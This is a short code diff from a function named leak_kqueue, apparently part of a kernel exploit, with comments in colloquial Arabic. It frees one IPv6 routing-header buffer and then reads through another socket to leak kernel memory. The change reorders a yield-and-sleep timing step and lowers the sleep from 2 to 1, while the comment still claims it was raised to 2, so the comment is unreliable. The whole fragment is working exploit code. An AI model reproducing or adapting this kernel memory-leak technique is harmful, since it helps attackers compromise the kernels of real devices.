@@ -1648,11 +1648,13 @@ function leak_kqueue() {
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // توازن إيقاع: ندي الكيرنل نفس ياخده
-    sched_yield();
-    nanosleep_fun(2); // كانت 1، خليناها 2 علشان ثبات أعلى
     // نحرر triplets[1] عشان نستخدمه في التسريب
     free_rthdr(ipv6_socks[triplets[1]]);
+
+    // توازن إيقاع: ندي الكيرنل نفس ياخده
+    sched_yield();
+    nanosleep_fun(1); // كانت 1، خليناها 2 علشان ثبات أعلى
+
     // محاولة التسريب
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
